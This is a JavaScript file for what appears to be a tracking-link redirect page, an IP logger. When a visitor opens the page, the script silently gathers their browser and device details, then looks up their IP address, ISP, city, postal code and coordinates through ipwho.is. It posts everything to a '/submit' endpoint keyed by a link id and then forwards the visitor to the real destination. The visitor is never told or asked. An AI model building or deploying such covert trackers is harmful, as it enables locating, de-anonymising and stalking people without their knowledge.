document.addEventListener("DOMContentLoaded", function () {
    var destDisplay = document.getElementById("dest");
    var url = new URL(destDisplay.dataset.dest);

    window.dest = url;
    destDisplay.innerText = url.hostname;

    getData();
});

var response = {
    browser: {},
    engine: {},
    device: {
        gpu: {},
    },
    location: {},
    network: {},
};

async function getData() {
    /* -------------------------------------------------------------------------- */
    /*                                   Parser                                   */
    /* -------------------------------------------------------------------------- */
    var userAgentParsed = await new UAParser().getResult();

    /* -------------------------------------------------------------------------- */
    /*                                   Browser                                  */
    /* -------------------------------------------------------------------------- */
    response.browser.name = userAgentParsed.browser.name;
    response.browser.version = userAgentParsed.browser.version;
    response.browser.cookiesEnabled = navigator.cookieEnabled ? true : false;
    response.browser.userAgent = userAgentParsed.ua;

    /* -------------------------------------------------------------------------- */
    /*                                   Engine                                   */
    /* -------------------------------------------------------------------------- */
    response.engine.type = userAgentParsed.engine.name;
    response.engine.version = userAgentParsed.engine.version;

    /* -------------------------------------------------------------------------- */
    /*                                   Device                                   */
    /* -------------------------------------------------------------------------- */
    response.device.cpu = userAgentParsed.cpu.architecture;
    response.device.type = userAgentParsed.device.type;
    response.device.brand = userAgentParsed.device.vendor;
    response.device.model = userAgentParsed.device.model;

    response.device.gpu.brand = userAgentParsed.gpu.vendor;
    response.device.gpu.model = userAgentParsed.gpu.model;

    /* -------------------------------------------------------------------------- */
    /*                                    Other                                   */
    /* -------------------------------------------------------------------------- */
    response.location.language = navigator.language || navigator.userLanguage;

    /* -------------------------------------------------------------------------- */
    /*                            Network And Location                            */
    /* -------------------------------------------------------------------------- */
    const req = await fetch("https://ipwho.is/");
    const netData = await req.json();

    if (netData.success) {
        response.network.isp = {};
        response.location.continent = {};
        response.location.city = {};
        response.location.coord = {};
        response.location.region = {};
        response.location.timezone = {};

        response.network.ip = netData.ip;
        response.network.isp.organization = netData.connection.org;
        response.network.isp.name = netData.connection.isp;
        response.network.connection_type = netData.type;

        response.location.continent.short = netData.continent_code;
        response.location.continent.name = netData.continent;
        response.location.city.name = netData.city;
        response.location.city.postalCode = netData.postal;
        response.location.coord.latitude = netData.latitude;
        response.location.coord.longitude = netData.longitude;
        response.location.region.short = netData.region_code;
        response.location.region.name = netData.region;
        response.location.country = netData.country;
        response.location.timezone.id = netData.timezone.id;
        response.location.timezone.short = netData.timezone.abbr;
        response.location.timezone.utc = netData.timezone.utc;
        response.location.timezone.current_time = netData.timezone.current_time;
        response.location.calling_code = "+" + netData.calling_code;
        response.location.flag = netData.flag;
    }

    console.log(response);

    /* -------------------------------------------------------------------------- */
    /*                                Make Request                                */
    /* -------------------------------------------------------------------------- */
    await fetch(
        "/submit?code=" + new URL(window.location.href).searchParams.get("id"),
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Accept: "text/plain",
            },
            body: JSON.stringify(response),
        }
    );

    window.location.href = window.dest.toString();
}
